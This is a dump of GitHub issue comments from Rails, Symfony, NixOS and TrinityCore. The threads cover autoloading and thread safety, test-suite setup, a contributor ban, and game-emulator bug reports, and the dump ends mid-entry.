rails/rails/594/1168812,594,Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 100745 UTC Maybe someone on rubyonrails-core@friend.com knows this about XML? ,,False
rails/rails/594/1168813,594,"Imported from Lighthouse. Comment by Nate Wiger - 2009-02-10 130352 UTC In XML, order may or may not matter. It's application-dependent. My opinion writing your app to rely on Rails to spit out XML/JSON automatically in some order (ASCII order?) is a bad idea.  It's not actually part of either the JSON or XML specs to do so.  It's a fragile approach. I'm not against this patch, but kazhar, I would strongly suggest a different approach for your app.  It is quite likely, since this is NOT a formally-defined behavior for JSON/XML, that sometime in the future a subsequent patch will get applied which will revert this behavior. Just write a .rxml and spit it out ordered by date.  Or create an ActiveRecordBase subclass with ""abstract_class = true"" that overrides the to_xml/to_json methods.  Use the Ruby sort method and spit out what you need. ",,False
rails/rails/594/1168814,594,"Imported from Lighthouse. Comment by Eloy Duran - 2009-02-10 133123 UTC Also, I just remembered OrderedHash is a subclass of Hash nowadays, so this probably already works as it should in 2.3. (That is, dumping as an unordered hash). ",,False
rails/rails/594/1168815,594,Imported from Lighthouse. Comment by Jeremy Kemper - 2010-05-04 174839 UTC [bulk edit] ,,False
rails/rails/594/1168816,594,Attachments saved to Gist ,,False
symfony/symfony/5402/6576318,5402,"➜  src  git clone git//github.com/symfony/symfony.git Cloning into 'symfony'... remote Counting objects 144068, done. remote Compressing objects 100% (44515/44515), done. remote Total 144068 (delta 91155), reused 135518 (delta 83912) Receiving objects 100% (144068/144068), 22.84 MiB | 837 KiB/s, done. Resolving deltas 100% (91155/91155), done.  ➜  src  cd symfony   ➜  symfony git(master) composer install   Installing dependencies   - Installing doctrine/common (2.3.x-dev)     Cloning 605b1b8b5a7bc8daf9111fb35483e5708e30de35    - Installing twig/twig (dev-master)     Cloning 459720ff3b74ee0c0d159277c6f2f5df89d8a4f6  Writing lock file Generating autoload files  ➜  symfony git(master) phpunit             Warning require_once(/usr/local/src/symfony/vendor/doctrine/orm/lib/Doctrine/ORM/Mapping/Driver/DoctrineAnnotations.php) failed to open stream No such file or directory in /usr/local/src/symfony/vendor/doctrine/common/lib/Doctrine/Common/Annotations/AnnotationRegistry.php on line 59  Call Stack     0.0002     274896   1. {main}() /usr/local/src/phpunit/phpunit.php0     0.0254    2845976   2. PHPUnit_TextUI_Commandmain() /usr/local/src/phpunit/phpunit.php46     0.0254    2846568   3. PHPUnit_TextUI_Command-&gt;run() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php130     0.0254    2847120   4. PHPUnit_TextUI_Command-&gt;handleArguments() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php139     0.0312    3242512   5. PHPUnit_TextUI_Command-&gt;handleBootstrap() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php615     0.0314    3252840   6. PHPUnit_Util_FileloadercheckAndLoad() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php787     0.0314    3253224   7. PHPUnit_Util_Fileloaderload() /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php77     0.0315    3260656   8. include_once('/usr/local/src/symfony/autoload.php.dist') /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php93     0.0330    3385496   9. Doctrine\Common\Annotations\AnnotationRegistryregisterFile() /usr/local/src/symfony/autoload.php.dist17  ",,False
symfony/symfony/5402/8188832,5402,I think you need to install the composer stuff with . ,,False
symfony/symfony/5402/8188837,5402,"you need to ask composer to install the dev dependencies too (used in the testsuite but not mandatory deps) by adding the --dev option when running the command. Btw, note that looking at the .travis.yml file allows to see what is needed to setup the testsuite (as it is the steps used to initialize it on Travis) ",,False
symfony/symfony/5402/8188931,5402,Information like this should not be hidden in JSON and YAML files. Now I have a different issue ➜  symfony git(master) composer install --dev    Installing dependencies from lock file Nothing to install or update Installing dev dependencies   - Installing phing/phing (2.4.12)     Downloading 100%             - Installing propel/propel1 (dev-master)     Cloning 6234fec72db2ad8fc0fe6e1ea6c1cd76abeeef5a    - Installing monolog/monolog (dev-master)     Cloning 1.2.1    - Installing doctrine/dbal (2.3.x-dev)     Cloning adb28e4e1f959d515971b8e8b7f05a01913a7b91    - Installing doctrine/orm (2.3.x-dev)     Cloning bbf527a27356414bfa9bf520f018c5cb7af67c77    - Installing doctrine/data-fixtures (v1.0.0-ALPHA2)     Downloading 100%           monolog/monolog suggests installing mlehner/gelf-php (Allow sending log messages to a GrayLog2 server) monolog/monolog suggests installing ext-amqp (Allow sending log messages to an AMQP server (1.0+ required)) monolog/monolog suggests installing ext-mongo (Allow sending log messages to a MongoDB server) doctrine/orm suggests installing symfony/yaml (If you want to use YAML Metadata Mapping Driver) Generating autoload files ➜  symfony git(master) phpunit                    Fatal error Cannot redeclare class Symfony\Component\Yaml\Tests\DumperTest in /usr/local/src/symfony/src/Symfony/Component/Yaml/Tests/DumperTest.php on line 161  Call Stack     0.0002     274984   1. {main}() /usr/local/src/phpunit/phpunit.php0     0.0757    2845976   2. PHPUnit_TextUI_Commandmain() /usr/local/src/phpunit/phpunit.php46     0.0757    2846568   3. PHPUnit_TextUI_Command-&gt;run() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php130     0.0757    2847120   4. PHPUnit_TextUI_Command-&gt;handleArguments() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php139     0.0974    3814688   5. PHPUnit_Util_Configuration-&gt;getTestSuiteConfiguration() /usr/local/src/phpunit/PHPUnit/TextUI/Command.php666     0.0974    3816464   6. PHPUnit_Util_Configuration-&gt;getTestSuite() /usr/local/src/phpunit/PHPUnit/Util/Configuration.php771     0.5300   11648312   7. PHPUnit_Framework_TestSuite-&gt;addTestFiles() /usr/local/src/phpunit/PHPUnit/Util/Configuration.php855     6.5017  138748672   8. PHPUnit_Framework_TestSuite-&gt;addTestFile() /usr/local/src/phpunit/PHPUnit/Framework/TestSuite.php417     6.5027  138749056   9. PHPUnit_Util_FileloadercheckAndLoad() /usr/local/src/phpunit/PHPUnit/Framework/TestSuite.php356     6.5027  138749336  10. PHPUnit_Util_Fileloaderload() /usr/local/src/phpunit/PHPUnit/Util/Fileloader.php77  ,,False
symfony/symfony/5402/8189040,5402,This is weird. I don't find any duplicated class declaration for this test. Could it be possible that phpunit includes the file twice ? ,,False
symfony/symfony/5402/8189235,5402,this is not hidden ,,False
symfony/symfony/5402/8189584,5402,"True, I did not know about  Why? Because I expect this information in a  file in the repository. Oh, well. ",,False
symfony/symfony/5402/8189613,5402,@friend Could you send a PR updating the README file with your expected information? ,,False
symfony/symfony/5402/8189709,5402,"Less snark, more pull requests maybe, @friend? FWIW, I'd put this into a  file. ",,False
symfony/symfony/5402/8189806,5402,"I do not like your attitude, @friend. What you ""demand"" already happened. ",,False
symfony/symfony/5402/8189908,5402,"I do not like yours, either. I asked for feedback on PHPUnit 3.7RC. @friend replied mentioning an issue with Symfony. To research this issue I need to run the Symfony test suite. I ran into problems, I opened this ticket asking for help. And while others are helping ... you are attacking me for not contributing. ",,False
symfony/symfony/5402/8189957,5402,"Right, I'm not helping, I was just the first person who told you how to install the required dependencies (here and on Twitter). All of your comments this PR are unnecessarily passive-aggressive. If you don't see that, then figure out a way to get out of your bubble until you do please. ",,False
symfony/symfony/5402/8190089,5402,"Indeed, you helped in the beginning. Sorry that I forgot about that. I overreacted because of your ""Less snark, more pull requests maybe"" remark. At least to me, such a remark is offensive. I do not use Composer, Symfony, Travis, etc. This is why I ran into the original issue. For me it was clear from the beginning that I would send a pull request once I gathered all the information I needed, that's just what I do. If my comments came across as passive-aggressive or offended in any way my apologies. ",,False
symfony/symfony/5402/8192265,5402,"And finally, did you find a solution for your  issue @friend ? ",,False
symfony/symfony/5402/8209936,5402,"Yes, it was PHPUnit's fault ",,False
symfony/symfony/5402/8210378,5402,"@friend, I see that you require a few more Symfony files there, how does that work when we want to test the Yaml component with PHPUnit, wouldn't we test the classes that are in PEAR then? ",,False
nixpkgs/NixOS/27244/241478644,27244,"Issue description GitHub says ""You can't comment at this time."". Steps to reproduce Comment too much? ",,False
nixpkgs/NixOS/27244/313880924,27244,"I don't think so.  The conversation is unlocked and I haven't seen ability to block particular contributor-thread pairs.  Sometimes I got such errors transiently due to network failures.  Still, there might be stuff I've missed... ",,False
nixpkgs/NixOS/27244/313881008,27244,"@friend I just tried in another random thread opened by @friend and I suspect he has me on his blocked users list. I didn't know that was how the feature worked, but I suspect that's how it works. ",,False
nixpkgs/NixOS/27244/313881044,27244,"@friend As a consequence, he would also not see my @friend. So, if someone could ask him to reconsider would be swell. ",,False
nixpkgs/NixOS/27244/313883740,27244,"Ah, yes, that's probably what's happened. ",,False
nixpkgs/NixOS/27244/314074359,27244,"@friend, you have been blocked from the organization, due to your hostile behaviour towards contributors. ",,False
nixpkgs/NixOS/27244/314224027,27244,"@friend IMO @friend should be unbanned. He/she/they has a really strange and trollish way of talking, but there should be some warnings first, before ban. Perhaps he/she/they were warned already? @friend commenting on your opinion that looks... great! I've looked through some of his reviews, and all of them were on-topic. The way I see it, @friend has a constant 1y+ interest in Nixpkgs/NixOS projects and wants them to be improved, just like me. ",,False
nixpkgs/NixOS/27244/314229230,27244,"I'd personally think that raising this ticket and finding to be banned by an individual member should have been a warning by itself, and a day or two after that there was that ""final"" thread... ",,False
nixpkgs/NixOS/27244/314296476,27244,"I added this user to my personal block list almost exactly a year ago (2016-06-07), where I asked another person in the community to block them. At that time, I noted that they had recently been blocked by other major projects as well. At that time, I asked the other community member I messaged to review some other threads this user had been part of. This resulted in those threads being updated, to remove the nastiness. In my opinion, the most valuable thing we have put together is our welcoming and supportive community. Anything that jeopardizes that jeopardizes the future of NixOS. I don't volunteer my time here to be berated, and I don't think anyone else does, either. I love this community, I deeply appreciate all the hard work from all the hundreds of contributors, and absolutely support @friend's decision to remove people who make it unpleasant to be part of an otherwise top notch group. ",,False
nixpkgs/NixOS/27244/314409794,27244,Another instance of a negative conversation in a Pull Request ,,False
TrinityCore/TrinityCore/16280/126999903,16280,Branch  3.3.5 Commit  0316dff24530da83ef3466500ee8bd4e1af548ba When you are enter on trial of the crusader then start the event .  gormok the impaler comes inside the ring and stay ... nothing happened and he is not selectable and doesn't moving kill him with die and the snakes are same .  Dreadscale come in and the other one does not come up from the ground . before this i'm on  347373264b4ca5046af5c23378117e6ddb66504d  and everything works fine . ,,False
TrinityCore/TrinityCore/16280/172159717,16280,linking these to reference what you are talking about with the disables. ,,False
TrinityCore/TrinityCore/16280/172159823,16280,"@friend   it's already disabled in db , i'v encountered another issue with new commits . ",,False
TrinityCore/TrinityCore/16280/172160157,16280,"Like I said, I was just referencing what you were talking about. ",,False
TrinityCore/TrinityCore/16280/172171408,16280,Very likely bug on boundaries commit. ,,False
TrinityCore/TrinityCore/16280/172216664,16280,Started with 2da458c56d024aac04468ce2af454a83ad790bf6 Tested with the previous commit and all ok. ,,False
TrinityCore/TrinityCore/16280/172260310,16280,@friend since when exactly does Sindragosa have anything to do with Trial of The Crusader? ,,False
TrinityCore/TrinityCore/16280/172260419,16280,@friend realy stupid?This problem is boundaries system. ,,False
TrinityCore/TrinityCore/16280/172261630,16280,@friend it would be great if you could speak/write in a slightly more moderate tone. Those phrases you use aren't really appropriate for an issue tracker. I'm not sure how many people are willing to help you with such an attitude. Just my 2 cents... ,,False
TrinityCore/TrinityCore/4603/2711445,4603,"Hello, I have this crash recurrently  0  UnitIsImmunedToSpellEffect (this=0x7fff572a7000, spellInfo=0x7fffe8c8b800, index=0) at /home/game/origins/compil/darluok/src/server/game/Entities/Unit/Unit.cpp11546     aura = 3     effect = &lt;value optimized out&gt;  1  0x0000000000b4d3d6 in SpellAddUnitTarget (this=0x7fff2cc61b00, target=0x7fff572a7000, effectMask=3, checkIfValid=&lt;value optimized out&gt;) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp956     targetGUID = &lt;value optimized out&gt;  2  0x0000000000b5f287 in SpellSelectEffectTargets (this=0x7fff2cc61b00, i=0, cur=...) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp2506     maxTargets = 0     pushType = PUSH_DST_CENTER     modOwner = 0x7fff7f44b000     effectMask = 3  3  0x0000000000b60577 in SpellSelectSpellTargets (this=0x7fff2cc61b00) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp717     implicitTargetMask = &lt;value optimized out&gt;     i = 0     processedTargets = 0  4  0x0000000000b61468 in Spellcast (this=0x7fff2cc61b00, skipCheck=true) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp3173  No locals. 5  0x0000000000b62b20 in SpellEventExecute (this=0x7fff2da38af0, e_time=2349594, p_time=0) at /home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp6523  No locals. 6  0x0000000000ceba3f in EventProcessorUpdate (this=0x7fff7f44b280, p_time=342) at /home/game/origins/compil/darluok/src/server/shared/Utilities/EventProcessor.cpp47     Event = 0x7fff2da38af0  7  0x00000000008fb56c in UnitUpdate (this=0x7fff7f44b000, p_time=1462399696) at /home/game/origins/compil/darluok/src/server/game/Entities/Unit/Unit.cpp302     __FUNCTION__ = ""Update""  8  0x000000000097e2d5 in PlayerUpdate (this=0x7fff7f44b000, p_time=342) at /home/game/origins/compil/darluok/src/server/game/Entities/Player/Player.cpp1542     now = &lt;value optimized out&gt;     pet = &lt;value optimized out&gt;  9  0x0000000000a641b6 in MapUpdate (this=0x7fffdfa5b000, t_diff=342) at /home/game/origins/compil/darluok/src/server/game/Maps/Map.cpp537     player = 0x7fff7f44b000     updater = {i_timeDiff = 342}     grid_object_update = {i_visitor = @friend}     world_object_update = {i_visitor = @friend}  10 0x0000000000a72381 in MapUpdateRequestcall() () No symbol table info available. 11 0x0000000000ce6911 in DelayExecutorsvc (this=0x7fffea3a3b40) at /home/game/origins/compil/darluok/src/server/shared/Threading/DelayExecutor.cpp52     rq = 0x7fff6efb3790  12 0x00007ffff76f1d47 in ACE_Task_Basesvc_run (args=&lt;value optimized out&gt;) at ../../ace/Task.cpp275     t = 0x7fffea3a3b40     svc_status = &lt;value optimized out&gt;  13 0x00007ffff76f30d1 in ACE_Thread_Adapterinvoke (this=0x7fffd6a1ed00) at ../../ace/Thread_Adapter.cpp98     exit_hook_instance = &lt;value optimized out&gt;     exit_hook_maybe = {instance_ = 0x0}     exit_hook_ptr = &lt;value optimized out&gt;  14 0x00007ffff5fa18ba in start_thread () from /lib/libpthread.so.0 No symbol table info available. 15 0x00007ffff5d0902d in clone () from /lib/libc.so.6 No symbol table info available. 16 0x0000000000000000 in ?? () No symbol table info available. Patch  wintergrasp Revision  57490ead833074bd83ae38be8ee50e9f9813759a ",,False
TrinityCore/TrinityCore/4603/3341054,4603,"I suggest a firewall (at least software) for your server, it's really vulnerable. ",,False
TrinityCore/TrinityCore/4603/3341080,4603,Why ? I didn't get the point. ,,False
TrinityCore/TrinityCore/4603/3343803,4603,Custom fixes or maybe a pull request implemented like for example the Immunity handling? ,,False
TrinityCore/TrinityCore/4603/3343957,4603,"No big custom fix, I've added some more immunities to Vehicles, but in the way Trinity dev have already done. ",,False
TrinityCore/TrinityCore/4603/3343975,4603,"do you know if I desactivate GCC optimisation, I will have the targetGUID and the spell/aura ID? ",,False
TrinityCore/TrinityCore/4603/3343983,4603,(and what is the relationship with a firewall...!?!) ,,False
TrinityCore/TrinityCore/4603/3344003,4603,I'm saying that your french private server doesn't have a firewall and it's easily crashable / hackable ;) ,,False
TrinityCore/TrinityCore/4603/3344030,4603,"/home/game/origins/compil/darluok/src/server/game/Spells/Spell.cpp Nothing more to be said.  «  francophones, gratuits &amp; légaux World of Warcraft »  PUBLIC SERVERS ARE ILLEGAL BY ESSENSE ",,False
TrinityCore/TrinityCore/4603/3344355,4603,Please shut up. Thanks. (~&gt;Mods) ,,False
TrinityCore/TrinityCore/4603/3346232,4603,no one appreciates that kind of attitude. the people here work hard to get these things working and most if not all private servers benefit from it without giving much if anything back in return. ,,False
TrinityCore/TrinityCore/4603/3347984,4603,"the most funny thing is they just know how to install a server and wait the money darluok, making money at it best. ",,False
rails/rails/13142/23639400,13142,"In Rails 3.x, the  config option was available for controlling whether autoloading was enabled as a fallback in case eager loading fails. This option has been removed from Rails in this commit e6747d87. The behaviour was changed so that autoload is disabled entirely when eager loading is enabled. This seems to make sense to me. However, in a8bf129, the initializer which disabled autoload when eager load is true was removed entirely. Now we're stuck with Rails behaving in a non-threadsafe way by default, which is possibly very difficult to detect. I realize I can add my own initializer to solve this problem, but if we're encouraging people to build threadsafe apps by default now, then it shouldn't require this level of knowledge to make Rails behave in a thread-safe way. The reasoning in a8bf129 seems flawed to me. Failing hard is a good thing, failing hard means subtle thread safety issues don't arise in a production environment sometimes because someone forgot a require somewhere. Thread safety is hard enough as it is. In my opinion, a8bf129 should be reverted. If this is deemed too aggressive, then maybe the  option should be reinstated, probably set to true by default, I can prepare a pull request for this if this is the preferred option. ",,False
rails/rails/13142/29736103,13142,"I remember that one of the issues that made a8bf129 is that people usually put lib in the autoload path, and since lib usually may have a lot of development/test only files these files will be loaded by default in production. In my opinion we should bring back ",,False
rails/rails/13142/29736741,13142,Between this was the biggest discussion in the history of the Rails core and seems we will start again smile ,,False
rails/rails/13142/29744953,13142,"@friend unfortunately both reverting a8bf129 and adding back  are problematic because the only way to really test it is live in production. However, Rails is still threadsafe by default because all the default autoload paths are eagerly loaded as well. The problem only appears when a developer adds a directory to  that is not eagerly loaded - typically this is the  folder. This folder often contains all sorts of junk and because of this it's not safe to eagerly load it by default as you would see strange errors when running in production by including development related code and libraries. The alternative of hard failing is unpalatable as it's often old apps with weaker test coverage that have added  to  and making these fail hard is something we decided after a lengthy discussion that we didn't want to do (93 messages and multiple Campfire discussions!). If developers follow our guidelines of not changing , adding directories to  for autoloading code and explicitly requiring code in  then Rails will be threadsafe. ",,False
rails/rails/13142/29751578,13142,Agree with @friend ,,False
rails/rails/13142/29764665,13142,"@friend Where are these guidelines documented? If changing autoload_paths is discouraged, then this should be documented somewhere, as far as I can tell, no such documentation exists. Ideally, manipulating the list of load paths should generate a warning. I know this is common cannon, but ""everyone knows this"" really doesn't cut it in terms of documentation. I'm worried by the fact that this whole reasoning builds on the fact that eager_load works perfectly, can we really guarantee that it does? With this in place, autoloading is still enabled, it could still be triggered, it could still create thread-safety problems. My experience with threaded programming is that you want to eliminate even the possibility of thread-safety issues if you can. ",,False
rails/rails/13142/29779529,13142,"@friend I thought we had something in Configuring Rails Applications but I may have been thinking of Ryan Bigg's guides. If there's nothing, then I will add something. We went through a list of possible scenarios about warning people - they all sucked in one way or another. Does eager loading work perfectly? Probably not as nothing is perfect but I know that it'll require every file in your  array which is as good as it's likely to get. We can't protect against people doing crazy stuff like requiring the same file in different threads so something may break. Our default position can't be to break people's apps in production after they've upgraded by disabling all code loading, so given that I've not seem any significant traffic on this topic since we've released Rails 4 I'm loathe to make changes to it. ",,False
rails/rails/13142/29786379,13142,"The thing that worries me is not so much that it misses a file, but rather that it misses a constant. There any number of ways an additional, undefined constant might pop up during request processing. What happens then? Since autoloading is still enabled, we'll still hit load_missing_constant, this methods uses a lot of global state. I have no idea what'll happen, maybe it works just fine because there is no possibility of anything being mutated, but I don't know the code well enough. ",,False
rails/rails/13142/29786572,13142,"By the way, we ended up calling  in an after_initialize block. IMO this is a good compromise, autoloading is enabled during the initialization process, which means all its convenience is there, and we don't have to worry too much about explicit requires. Since initialization is single-threaded this is safe. However, once we start processing requests, constants can no longer be autoloaded. Maybe I'm missing something, but this seems pretty safe to me. ",,False
rails/rails/13142/29788440,13142,"The scenario is that a developer has added  to  which is not eager loaded because it's full of junk you don't want in production like tasks, generators, etc. You then call  and start processing requests but a controller action not yet requested refers to an undefined constant and when it's reached it'll blow up. It's this that we want to prevent when upgrading Rails applications. ",,False
rails/rails/13142/29831652,13142,@friend what about adding  directory to brand new rails application? ,,False
rails/rails/13142/29969951,13142,You can add it now if you want and it'll work like any other app folder - I don't think we want to add it by default as a lot of apps have empty lib folders so adding another empty folder seems unnecessary. ,,False
rails/rails/13142/30023960,13142,"@friend you wrote this The problem is that in the case where an app is multi-threaded, and we don't switch off autoload, the case would be that it probably won't blow up, but random stuff will mysteriously sometimes fail in weird ways. So ask yourself this, what would you rather want, option 1) where you can get an exception at runtime, or option 2) where you get random, unpredictable, weird, hard to explain, difficult to debug bugs at runtime. Personally, I'm going to choose option 1. The downside of thread-safety issues is so much worse than the downside of the possibility of an exception. The way you're handling it makes it sound as though thread-safety is not important, as though Rails is still optimizing for the single-threaded case. That seems like a huge step back. ",,False
rails/rails/13142/30083628,13142,"Depends on the situation, would you prefer your highly traffic, e-commerce website to fail for all orders in the checkout or a small percentage of them. You may say option one but the accountant may say option 2. As long as the code you write is thread safe then you'll be fine. If it's not then whether we autoload or not isn't really going to save you if you don't know what you're doing as there are many ways to make code not thread safe - autoloading is just one of them. All Rails is doing is not facepunch-ing you with an exceptions when you upgrade - if you want to facepunch yourself by all means go ahead. smile I'm more than willing to accept a patch to the guides telling developers how to remove the autoloading but I think we have the right default given the amount of thought that went into making the decision. ",,False
rails/rails/13142/30086439,13142,"Who is going to run into a situation where all their orders fail and they don't notice? There are staging environments and smoke tests for these kinds of things. It's way more insidious and harder to notice when 0.1% of your orders fail as opposed to 100% of your orders failing. That's the point I'm trying to make. Failing hard is good. Especially with regards to thread safety. Also, honestly, you're telling me to go fuck myself? What kind of way is that of handling legitimate issues in an open source project? I don't think I've been discourteous in any way, I'm simply trying to get you to see my perspective on this. In 8 years in the Ruby community, I've never seen this much discussed shitty attitude we supposedly have, until today. I'm seriously very disappointed. ",,False
rails/rails/13142/30086838,13142,"Trust me, not every project has these kind of things - in an ideal world, yes, but we don't live in an ideal world. I think you've misinterpreted what I was trying to say - what I'm saying is that going for a hard fail is an aggressive choice. That may be your preference but we can't adopt it as a default, however I'm willing to accept changes to make it easier if a developer wishes be that aggressive in their own projects. If I caused offence, I'm sorry. ",,False
rails/rails/13142/208904424,13142,Should any one stumble upon this issue @friend reverted commit a8bf129 in  which is in v5.0.0.beta1 and later. ,,False
rails/rails/13142/264807541,13142,IMO auto-load should be disabled as a feature completely if it is not going to work. It is very frustrating for a new rail developer to read in documentation to add lib into auto_load list and then trying to deploy strange errors begin to happen. And auto_load can happily start raising an error that it is not supported and eaget_load needs to be used. This will not confuse anybody unlike present situation. It could be documented that lib can be added to eager_load instead which works fine in production env. ,,False
rails/rails/13142/275416619,13142,"As @friend mentioned above, the autoloader should be removed from Rails. It has never worked as advertised, and I do not see any chance of that thing ever working. In the past, it has demonstrated a complete misunderstanding of namespaces, injecting constants in wrong scopes and making it impossible to structure Rails projects without resorting to terminology from deep down the thesaurus. At the very least, the ""documentation"" should be amended to have a big and clear warning that relying on anything but top-level constants inside  being picked up will lead to problems. ",,False
rails/rails/13142/275478305,13142,"@friend actually one of the long-standing issues (which is a Ruby problem and not a Rails problem) where a top level constant is found because of  being in the ancestor chain of  and not  will be fixed in Ruby 2.5. In my experience with working on a range of apps developed by other teams, any problems with autoloading has been down to incorrect additions to autoload_paths - just use folders inside app for stuff that's eager/auto loaded and lib for things that are manually required. That and strict mapping of namespace hierarchy to path names eliminates 99.99% of problems. Autoloading in Rails is both the basis for eager loading in production and for reloading in development - I don't see the value in removing those features. If you want to manually control loading in your Rails app then it's perfectly possible to set up if you so desire, but it's not the default experience we want. ",,False
rails/rails/13142/275492070,13142,"@friend , I was not specific in my last comment. For me it was frustrating that autoloading worked perfectly well in dev env but not in production env. In production some classes in a deeper namespace were missing. I think the way I setup auto-load [1] must be correct because it worked in dev env. As soon as I run server (even locally) in production mode, it was giving troubles. It might have something to do with the issue you link to, because I have one class with same name in top namespace and under a module. Or maybe just in production  is using multiple workers. In any case, if autoloading is not recommended as it appears from this thread, then do not advertise it in documentation. As soon as I've put lib in the eager load list instead of the auto-load list, things started to work properly in production env. There is no official documentation listing the situations where autoloading might be an issue. I don't see how it makes sense to keep current situation - documentation advertises auto-loading, github thread discourages using it, there appears to be no incentive to fix auto-loading. The easiest solution is to at least update documentation to recommend eager loading instead of auto loading. I can't see any reason for not not doing this. [1] Here's how I actually do inside  ",,False
rails/rails/13142/275549669,13142,@friend the recommendation is to create app/lib and drag all those files that need to work with reloading/autoloading/eagerloading into there from lib and not touch the config at all. We've taken out the comment about autoload_paths from the generated application.rb so the only way someone will find it is if they go looking for it. Willing to accept a PR that places a great big warning in the relevant config section of the guide that basically says 'Here be dragons …' 😄 ,,False
rails/rails/13142/275601252,13142,"@friend , I'm neither so knowledgeable about rails internal nor so good with english to update the guide. IMO a simple adding of a warning would not help a lot. In the doc link I posted originally, there is a whole section about  and is mentioning auto-loading in various places. Very little is said about eager loading. Also in this guide, there is no mention of  nor google showed results when I was searching about . Do you know where is a good place to file an issue about the aforementioned guide? ",,False
rails/rails/13142/276323251,13142,"@friend, a mechanism that will inject top-level constants into modules is defective, and not due to a ""Ruby problem"". Case in point, we tried having a class . I literally had the following happen in a console &gt; AProcess == Process false &gt; AProcess == Process true  I am currently rewriting a medium-sized project to explicit loading of things in  (which is funny because something will still finger around in there before explicit loading and provoke constant re-assignment warnings…), and stumbled upon another instance where lookup would be similarly broken. This is not a Ruby problem! Plain Ruby does not arbitrarily screw up namespaces that badly; it takes a lot of work to create something as fragile and wrong. ",,False
rails/rails/13142/276346895,13142,@friend that's not what I see with a clean Rails app If you can reproduce your experience in a clean Rails app then please file a bug report. ,,False
rails/rails/13142/296306044,13142,"This is Bad.  The whole purpose of lib in the first place is to seperate non-domain-specific code from the app/ directory, which is domain specific. Rails seems to be content to violate established best practices regarding the division between lib/ and app/.  Messed up ",,False
TrinityCore/TrinityCore/14120/57459083,14120,"I couldn't find any other issue regarding this. I suppose this is a well known issue/exploit but I'll explain it briefly  Any Pet which can be commanded to attack (ie any warlock pet, hunter pet, frost mage pet,... etc) will go through walls and solid gobjects, mainly doors, to attack its objective.  This offers exploit opportunities to players such as starting combat with locked bosses and avoid doing the whole instance (ie Ymiron at Utgarde Pinnacle). hash c5dac48436c8a00d40640af9aecaaa71d549135a Using mmaps. ",,False
rails/rails/13142/305373140,13142,"@friend  so what would be your recommendation then? i do agree with you, that an external API wrapper should not be placed anywhere inside /app and personall i would rather see it in /lib ",,False
rails/rails/13142/310066834,13142,won't autoload. Rails 5.1 ,,False
TrinityCore/TrinityCore/14120/74217692,14120,"Walls or doors ? Because doors are ingame gameobjects spawned at runtime, walls are already present in client files and handled by MMAPs ",,False
rails/rails/13142/319643402,13142,Any link for best practise guidelines here? ,,False
rails/rails/13142/330628038,13142,"🙄 seems fine to move  inside . Just takes a minor adjustment in thinking, nbd. Alternatively, you could do what my coworker did and add  to  ♠¯_(ツ)_/¯` ",,False
TrinityCore/TrinityCore/14120/74243652,14120,"then it's a know old issue, mmaps don't take into account any dynamically spawned gameobject ",,False
TrinityCore/TrinityCore/14120/74277714,14120,well I just wanted to have it on an open issue ^^ ,,False
TrinityCore/TrinityCore/14120/74327755,14120,it has been a known issue for 2 years at least and it's going to be like that for 2 more years too ,,False
TrinityCore/TrinityCore/14120/74369323,14120,"It's not an attitude, it's the simple consequence of the limitations of recastnavigation. We already worked on this issue months ago, people before us tried too but no steps forward have been made (and I'm actually the only dev who fixed an issue in recast and got his PR accepted). You could study how recastnavigation works and see with your own eyes what l'm talking about. ",,False
TrinityCore/TrinityCore/14120/74757606,14120,"If anyone would like to mess with recast, here's an idea ",,False
TrinityCore/TrinityCore/14120/182321976,14120,"1 year passed, 1 left to go ",,False
TrinityCore/TrinityCore/14120/182322504,14120,"Not high anymore, with the new boundaries system from Treeston you can't pull ingvar anymore. ",,False
TrinityCore/TrinityCore/14120/279225275,14120,2 years passed! ding! ,,False
TrinityCore/TrinityCore/14120/279250131,14120,"@friend in IRC, you mentioned that there are 2 types of game objects  ""static game objects"" such as doors. They are created at exactly the same place each time they are spawned in the world. In other words, their location and geometry is known at build time. And then ""dynamic game objects"" which can be spawned on a new and unknown location each time they are loaded. Their location and geometry is only known at runtime.  The support of what I call ""dynamic game objects"" in the MMAPs would be a really cool feature. But is it even blizz-like? Are there cases where game objects are spawned at a new location on each game session? I don't think such feature is even possible considering the constraint of performance and memory space that TC has. If we were to only implement support of ""static"" game objects, it would be much simpler. Won't be easy game but I got my little idea on how to do it. ",,False
TrinityCore/TrinityCore/14120/279333243,14120,"I think we can implement features as incremental iterations, so handling doors would be nice and it will help understand how recast and detour work. We can worry about dynamic gameobjects later. ",,False
TrinityCore/TrinityCore/14120/451174092,14120,"@friend This is still an issue on  yes, mmaps, vmaps and all that stuff is enabled. not sure why it was closed as it never got fixed. ",,False
TrinityCore/TrinityCore/1225/913219,1225,"'''Armor''' Provided by Paladin (Devotion Aura), Shaman (Stoneskin Totem) ''Stacks'' '''5% Melee Critical Strike Chance''' Provided by Warrior (Rampage), Druid (Leader of the Pack) ''Stacks'' '''5% Spell Critical Strike Chance''' Provided by Druid (Moonkin Form), Shaman (Elemental Oath) ''Stack partially (but only for the Moonkin, who provides the aura)'' '''10% Attack Power''' Provided by DK (Abomination's Might), Hunter (Trueshot Aura), Shaman (Unleashed Rage) ''Stack partially (the same thing like 5% Spell-Crit, if there are for example 2 Hunters, the one who activate Trueshot Aura later get's 20% Attack Power)'' '''Mp5''' Provided by Shaman (Mana Spring Totem), Paladin (Blessing of Wisdom) ''Stacks'' '''Spell Power''' Provided by Warlock (Demonic Pact), Shaman (Totem of Wrath), Shaman (Flametongue Totem) ''Stack partially (Demonic Pact and Totem of Wrath/Flametongue Totem stacks, Totem of Wrath and Flametongue Totem does not stack)'' '''Healthpoints''' Provided by Warrior (Commanding Shout), Warlock (Blood Pact) ''Stacks'' '''Stats Multiplier''' Provided by Paladin (Blessing of King), Paladin (Blessing of Sanctuary) ''Stacks''  '''3% Damage''' Provided by Paladin (Sanctified Retribution), Mage (Arcane Empowerement), Hunter (Ferocious 